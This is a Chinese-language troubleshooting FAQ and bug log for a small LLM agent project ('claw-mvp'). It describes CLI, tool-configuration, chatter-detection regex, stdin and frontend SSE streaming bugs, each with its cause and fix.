### Q: Agent 只回复短文本（如"我来"）后不再工作
**原因**：System Prompt 过长导致 LLM 行为退化。检查 prompt 长度是否超过 600 字符。
**修复**：精简 System Prompt，合并冗余规则，优先保留核心行为指令。

### Q: Web 界面每行只显示几个字，且每行前都有 "claw-mvp"
**原因**：前端 `hasToolCalls` 标志未复位，导致每个 `event: text` chunk 都创建新消息气泡（详见 BUG-MVP-018）。
**修复**：在创建 post-tool 文本消息气泡后添加 `hasToolCalls = false`。

### Q: Web 界面文字重复/乱序
**原因**：前端 SSE 解析用 `lines.indexOf(line)` 取 data 行，多事件同 buffer 时取错数据（详见 BUG-MVP-017）。
**修复**：改用 `\n\n` 双换行分割事件块，逐块独立解析 event/data。

---

## 新增 Bug（2026-05-28 第二轮实战发现）

### BUG-MVP-012 (P0) — Agent CLI 模式完全无输出：默认 callbacks 为空
- **发现日期**：2026-05-28
- **位置**：`src/agent.ts` 的 `constructor()` 和 `consumeStream()`
- **问题**：Agent 构造时未传入 callbacks，`this.callbacks` 为空对象 `{}`。`consumeStream()` 中 `this.callbacks.onStream?.(chunk.delta)` 始终为 no-op，LLM 的流式文本被累积到 `textContent` 但从未输出到终端，用户看到的是空响应
- **症状**：CLI 模式下发送消息后，终端无任何回复输出，prompt 直接返回
- **修复**：Agent 构造函数中检测 callbacks 为空时，设置默认 `onStream = process.stdout.write`、`onToolCall` / `onToolResult` / `onError` 也设置对应的 stdout 输出
- **关键细节**：Web 模式下 callbacks 会在 `handleChat` 中被 `webCallbacks` 覆盖，不受影响

### BUG-MVP-013 (P0) — 工具模块 workspace 配置未传递：ToolRegistry 未调 setConfig
- **发现日期**：2026-05-28
- **位置**：`src/tools/index.ts` 的 `ToolRegistry.register()` 和各工具模块的 `setConfig()`
- **问题**：每个工具模块（read/write/edit/exec/python）都导出 `setConfig()` 函数和独立的 `_config` 变量，但 `ToolRegistry.register()` 从未调用 `module.setConfig()`，导致 `_config` 始终为 `null`，`getWorkspace()` 回退到 `process.cwd()`
- **症状**：工具读写文件时使用当前工作目录而非配置的 workspace 目录，文件操作路径错误
- **修复**：`ToolRegistry.register()` 改为调用 `module.setConfig?.(this.config)`，注册工具时自动注入 workspace 配置
- **影响工具**：read、write、edit、exec、python（web_search 和 web_fetch 不依赖 workspace）

### BUG-MVP-014 (P0) — 反空话检测阈值过高导致正常回复被误判
- **发现日期**：2026-05-28
- **位置**：`src/agent.ts` 的 `looksLikeChatter()` 和 `CHATTER_PATTERNS`
- **问题**：长度阈值 300 字符太宽，正常中文回复（通常 100-150 字）落在此范围内；模式 `/^[我I].{0,5}(来|开始|准备|创建|生成|现在)/` 中 `.{0,5}` 贪婪匹配后会回溯，导致 "我开始分析你的需求，问题是..." 这种正常回复被判定为 "空话"
- **症状**：LLM 正常回复 → 判为空话 → 注入 SYSTEM 消息 "你的回复是空话" → LLM 困惑重试 → 再被判为空话 → 3 次后放弃，对话完全混乱
- **修复**：
  1. 阈值从 300 降到 **30 字符**（只拦截真正的短空话）
  2. 模式改为精确前缀匹配 `^(我来|我马上|我准备|let me |I will )`
  3. 移除宽泛的 `工作区.{0,30}如下` 等模式

### BUG-MVP-015 (P1) — 管道输入时 stdin EOF 竞态导致进程提前退出
- **发现日期**：2026-05-28
- **位置**：`src/index.ts` 的 readline `close` 事件处理
- **问题**：`echo "你好" | node src/index.ts` 时，readline 读到输入后 stdin 关闭触发 `close` 事件 → 立即 `process.exit(0)`，而 `agent.run()` 是异步的，尚未完成就被杀死
- **症状**：管道测试时 Banner 显示后立即 "再见" 退出，无 Agent 回复
- **修复**：添加 `processing` 标志位，`close` 事件检测到 `processing === true` 时轮询等待（最长 60s），处理完成后再退出
- **注意**：交互模式下不影响（stdin 保持打开），仅影响管道/自动化测试场景

### BUG-MVP-016 (P2) — Banner 在 Windows PowerShell GBK 终端乱码
- **发现日期**：2026-05-28
- **位置**：`src/index.ts` 和 `src/server.ts` 的启动 Banner
- **问题**：Banner 使用 box-drawing 字符（╔══╗║╚╝），在 Windows PowerShell 默认 GBK (CP936) 编码下渲染为 "鈺斺晲" 等乱码
- **症状**：启动 Banner 完全不可读
- **修复**：改用纯 ASCII 字符 `=== claw v0.2.0 ===` 替代 box-drawing 字符
- **注意**：Windows Terminal / cmd with chcp 65001 不受影响，但为兼容性统一使用 ASCII

### BUG-MVP-017 (P0) — 前端 SSE 解析用 indexOf 导致事件数据串位 🔥
- **发现日期**：2026-05-28
- **位置**：`public/index.html` 的 SSE 流解析逻辑
- **问题**：
  ```javascript
  const dataLine = lines[lines.indexOf(line) + 1];
  ```
  同一 buffer 内有多个同名事件时（如 3 个 `event: text`），`lines.indexOf(line)` 始终返回**第一个** `"event: text"` 的下标 0，后续同名事件全被错误指向第一个事件的 data 行
- **症状**：
  - AI 回复变成第一个 chunk 的重复："你你你" 而非 "你好啊"
  - 不同事件类型混入：text 事件读到 tool_call 的 data，JSON parse 失败后静默丢弃
  - 整个对话输出完全乱序
- **修复**：改用 SSE 协议规范的 `\n\n` 双换行分割事件块，逐块独立解析 event/data
- **关键细节**：这是前端唯一的致命 Bug，修复后流式输出才能正常显示

### BUG-MVP-018 (P0) — 前端 hasToolCalls 标志未复位导致每个 text chunk 创建一个新消息气泡 🔥
- **发现日期**：2026-05-28
- **位置**：`public/index.html` 的 `handleSSE('text', ...)` 处理
- **问题**：
  ```javascript
  case 'text':
    if (hasToolCalls && currentMsgBody && currentMsgBody.textContent.trim().length > 0) {
      currentAssistantDiv = addMessage('assistant', '');  // 创建新气泡
      // ❌ 缺少: hasToolCalls = false;
    }
  ```
  `hasToolCalls` 在 `tool_call` 事件中设置为 `true` 后永不复位（直到 `finishGeneration()`），导致工具调用后的**每一个** text chunk 都触发新气泡创建
- **症状**：
  ```
  claw-mvp
  。
  claw-mvp
  为准
  claw-mvp
  发布
  ```
  每个 chunk 都变成独立的 `<div class="message assistant">`（含 `msg-header` 显示 "claw-mvp"），用户看到每行只有几个字且前带 "claw-mvp"
- **修复**：创建 post-tool 文本消息气泡后立即 `hasToolCalls = false`。后续 `tool_call` 事件会自动重新置 `true`，多轮工具调用场景同样正确处理
- **关键细节**：这是 `hasToolCalls` 作为 "一次性" 开关的正确语义——触发一次后复位，等待下一轮工具调用重新激活
